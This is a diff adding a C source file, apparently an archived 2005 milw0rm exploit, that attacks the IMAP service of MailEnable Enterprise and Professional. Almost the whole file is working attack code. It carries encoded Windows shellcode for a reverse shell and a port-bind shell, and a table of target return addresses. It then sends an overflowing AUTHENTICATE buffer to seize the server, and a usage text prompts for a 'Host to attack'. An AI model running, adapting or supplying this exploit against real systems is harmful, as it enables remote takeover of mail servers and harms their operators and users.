@@ -1,0 +1,245 @@
+/*
+      +--=[--------------------------x0n3-h4ck Team Presents---------------------------]=--+
+      +--=[                                                                            ]=--+
+      +--=[ MailEnable (Enterprise <= 1.04)(Professional <= 1.54) remote Imapd exploit ]=--+
+      +--=[                                                                            ]=--+
+      +--=[  Bug discovered by..: Corryl    (Corryl80@gmail.com)                       ]=--+
+      +--=[  Exploit coded by...: Expanders (expanders@gmail.com)                      ]=--+
+      +--=[                                                       wwww.x0n3-h4ck.org   ]=--+
+      +--=[----------------------------------------------------------------------------]=--+
+      
+      Personal greetz goes to: crash-x for some code from his Cyrus Imapd sploit
+                               cybertronic for reverse shellcode
+                               K-C0d3r for coding support
+                               x0n3-h4ck.org Members and Friends
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdarg.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <netdb.h>
+
+/*
+Connectback Shellcode ::: 316 byte
+Link points:
+     Ip  : [111] unsigned long  (xored 0x99999999)
+     Port: [118] unsigned short (xored 0x9999)
+*/
+
+unsigned char reverse_sc[] =
+"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
+"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
+"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
+"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
+"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
+"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
+"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
+"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
+"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
+"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
+"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
+"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
+"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
+"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
+"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
+"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
+"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
+"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
+"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
+"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";
+
+/*
+Portbind Shellcode ::: 492 byte
+Link points:
+     Port: [266] unsigned short (xored 0x8888)
+*/
+unsigned char portbind_sc[] = 
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF"
+"\xFF\xFF\x8B\xC5\x83\xC0\x11\x33\xC9\x66\xB9\xC9\x01\x80\x30\x88" 
+"\x40\xE2\xFA\xDD\x03\x64\x03\x7C\x09\x64\x08\x88\x88\x88\x60\xC4" 
+"\x89\x88\x88\x01\xCE\x74\x77\xFE\x74\xE0\x06\xC6\x86\x64\x60\xD9" 
+"\x89\x88\x88\x01\xCE\x4E\xE0\xBB\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7" 
+"\xDC\x77\xDE\x4E\x01\xCE\x70\x77\xFE\x74\xE0\x25\x51\x8D\x46\x60"
+"\xB8\x89\x88\x88\x01\xCE\x5A\x77\xFE\x74\xE0\xFA\x76\x3B\x9E\x60" 
+"\xA8\x89\x88\x88\x01\xCE\x46\x77\xFE\x74\xE0\x67\x46\x68\xE8\x60" 
+"\x98\x89\x88\x88\x01\xCE\x42\x77\xFE\x70\xE0\x43\x65\x74\xB3\x60" 
+"\x88\x89\x88\x88\x01\xCE\x7C\x77\xFE\x70\xE0\x51\x81\x7D\x25\x60" 
+"\x78\x88\x88\x88\x01\xCE\x78\x77\xFE\x70\xE0\x2C\x92\xF8\x4F\x60" 
+"\x68\x88\x88\x88\x01\xCE\x64\x77\xFE\x70\xE0\x2C\x25\xA6\x61\x60" 
+"\x58\x88\x88\x88\x01\xCE\x60\x77\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60" 
+"\x48\x88\x88\x88\x01\xCE\x6A\x77\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60" 
+"\x38\x88\x88\x88\x01\xCE\x5E\xBB\x77\x09\x64\x7C\x89\x88\x88\xDC" 
+"\xE0\x89\x89\x88\x88\x77\xDE\x7C\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8" 
+"\x77\xDE\x78\x03\x50\xDF\xDF\xE0\x8A\x88\xAB\x6F\x03\x44\xE2\x9E" 
+"\xD9\xDB\x77\xDE\x64\xDF\xDB\x77\xDE\x60\xBB\x77\xDF\xD9\xDB\x77" 
+"\xDE\x6A\x03\x58\x01\xCE\x36\xE0\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B" 
+"\x4C\x24\x05\xB4\xAC\xBB\x48\xBB\x41\x08\x49\x9D\x23\x6A\x75\x4E" 
+"\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4" 
+"\x01\xDC\xAC\xD8\x05\xCC\xAC\x98\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1" 
+"\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE\x46\x03\x44\xE2\x77\x77\xB9\x77" 
+"\xDE\x5A\x03\x40\x77\xFE\x36\x77\xDE\x5E\x63\x16\x77\xDE\x9C\xDE"
+"\xEC\x29\xB8\x88\x88\x88\x03\xC8\x84\x03\xF8\x94\x25\x03\xC8\x80" 
+"\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF\x03\xE4\xAC\x90\x03\xCD\xB4\x03" 
+"\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1" 
+"\x03\xBC\x03\x8B\x7D\xBB\x77\x74\xBB\x48\x24\xB2\x4C\xFC\x8F\x49" 
+"\x47\x85\x8B\x70\x63\x7A\xB3\xF4\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B" 
+"\x55\xEE\x03\x84\xC3\x03\xD2\x94\x8B\x55\x03\x8C\x03\x8B\x4D\x63"
+"\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5\xD3\x4A\x8C\x88";
+
+
+int make_bindshell(int port);
+int make_reverseshell(char *ip, char *port);
+void help(char *program_name);
+
+
+struct vuln{char *platform;char *retloc;char *ecxloc;} targets[]= {
+    { "Windows   2003 - M. E. Enterprise", "\xEC\xDA\x07\x01", "\xE4\xDA\x07\x01",  },
+    { "Windows   2003 - M. E. Professional", "\xEC\xDA\x08\x01", "\xE4\xDA\x08\x01", },
+    { "Windows 2k Sp4 - M. E. Enterprise", "\x80\xE3\x69\x01", "\x78\xE3\x69\x01", },
+    { "Windows 2k Sp4 - M. E. Professional", "\x80\xE3\x6A\x01", "\x78\xE3\x6A\x01", },
+    { "Windows XP Sp2 - M. E. Enterprise", "\xF4\x22\x19\x01", "\xEC\x22\x19\x01", },
+    { "Windows XP Sp2 - M. E. Professional", "\xF4\x22\xB2\x00", "\xEC\x22\xB2\x00", },
+    { "Windows XP Sp1 - M. E. Enterprise", "\xF4\x22\x03\x01", "\xEC\x22\x03\x01", },
+    { "Windows XP Sp1 - M. E. Professional", "\xE8\xDA\x02\x01", "\xE0\xDA\x02\x01", },
+    { NULL }
+};
+
+int main(int argc, char *argv[]) {
+
+    struct sockaddr_in trg;
+    struct hostent *he;
+    long addr;
+    unsigned short port;
+    unsigned long ip;
+    int sockfd, buff,rc,opt,i;
+    int target=0,rport=143,lport=7320;
+    char *host=NULL,*lhost=NULL,*cbport;
+    char evilbuf[2048];
+    char buffer[1024];
+    char *request;
+    if(argc < 3 ) {
+	help(argv[0]);
+	exit(0);
+    }
+    while ((opt = getopt (argc, argv, "h:p:t:b:r:")) != -1){
+          switch (opt){
+	        case 'h':
+	            host = optarg;
+	            break;
+	        case 'p':
+                rport = atoi(optarg);
+                if(rport > 65535 || rport < 1){
+                    printf("[-] Port %d is invalid\n",rport);
+                    return 1;
+                }
+                break;
+            case 't':
+                target = atoi(optarg);
+                for(i = 0; targets[i].platform; i++);
+                if(target >= i && target != 1337){
+                    printf("[-] Wtf are you trying to target?\n");
+                    help(argv[0]);
+                }
+                break;
+            case 'b':
+                lport = atoi(optarg);
+                cbport = optarg;
+                if(lport > 65535 || lport < 1){
+                    printf("[-] Port %d is invalid\n",lport);
+                    return 1;
+                }
+                break;
+            case 'r':
+                lhost = optarg;
+                break;
+            default:
+                help(argv[0]);
+        }
+    }
+    
+    if(host == NULL)
+        help(argv[0]);
+
+    printf("\n\n-=[ MailEnable Imapd remote exploit ::: Coded by Expanders ]=-\n");
+    he = gethostbyname(host);
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    request = (char *) malloc(12344);
+    trg.sin_family = AF_INET;
+    trg.sin_port = htons(rport);
+    trg.sin_addr = *((struct in_addr *) he->h_addr);
+    memset(&(trg.sin_zero), '\0', 8);
+    printf("\n\n[-] Targeting: %s\n",targets[target].platform);
+    if ( lhost != NULL )
+       printf("[-] Reverse Shell on %s:%d\n\n",lhost,lport);
+    else
+       printf("[-] Bind Shell on %s:%d\n\n",host,lport);
+    printf("[-]Connecting to target   \t...");
+    rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));
+    if(rc==0) {
+              printf("[Done]\n[-]Building evil buffer   \t...");
+              memset(evilbuf,'A',1016);
+              memcpy(evilbuf+1016,targets[target].ecxloc,4);;
+              memset(evilbuf+1020,'A',2);
+              memcpy(evilbuf+1022,targets[target].ecxloc,4);
+              memcpy(evilbuf+1026,targets[target].retloc,4);
+              memset(evilbuf+1030,0x90,4);
+              if ( lhost == NULL) {
+                 make_bindshell(lport);
+                 memcpy(evilbuf+1034,portbind_sc,sizeof(portbind_sc));
+              } else {
+                make_reverseshell(lhost,cbport);
+                memcpy(evilbuf+1034,reverse_sc,sizeof(reverse_sc));
+              }
+              printf("[Done]\n[-]Sending evil request   \t...");
+              sprintf(request,"A001 AUTHENTICATE %s\r\n",evilbuf);
+              send(sockfd,request,strlen(request),0);
+              buff=recv(sockfd, buffer, 256, 0);
+              if ( lhost == NULL)
+                 printf("[Done]\n\n[------Now-telnet-(%s %d)------]\n\n",host,lport);
+              else
+                 printf("[Done]\n\n[------Now-wait-reverse-on-port-%d------]\n\n",lport);
+    }
+    else
+              printf("[Fail] -> Unable to connect\n\n");
+    close(sockfd);
+    return 0;
+}
+
+int make_bindshell(int port) {
+   port = htons(port^(unsigned short)0x8888);
+   memcpy(&portbind_sc[266], &port, 2);
+}
+
+int make_reverseshell(char *ip, char *port) {
+    unsigned long xorip;
+    unsigned short xorport;
+    xorip = inet_addr(ip)^(unsigned long)0x99999999;
+    xorport = htons(atoi( port )^(unsigned short)0x9999);
+    memcpy ( &reverse_sc[111], &xorip, 4);
+    memcpy ( &reverse_sc[118], &xorport, 2);
+}
+void help(char *program_name) {
+  int i;
+  printf("\n\t-=[  Mail Enable Pro & Enterprise Imapd Remote Exploit  ]=-\n");
+  printf("\t-=[                  www.x0n3-h4ck.org                  ]=-\n");
+  printf("\t-=[    Discovered by CorryL     Coded by Expanders      ]=-\n\n");
+  printf("Usage: %s -h <Host> [parameters]\n\n",program_name);
+  printf("Parameters:\n");
+  printf("\t\t-h <host>   : Host to attack\n");
+  printf("\t\t-p <port>   : Imapd Port (Default 143)\n");
+  printf("\t\t-t <target> : Target type (Default 0)\n");
+  printf("\t\t-b <port>   : Bind or reverse shell port (Default 7320)\n");
+  printf("\t\t-r <host>   : Local ip for reverse shell\n");
+  printf("Target List:\n");
+  for(i = 0; targets[i].platform; i++)
+        printf("\t\t%d\t %s\n", i, targets[i].platform);
+}
+
+// milw0rm.com [2005-04-05]
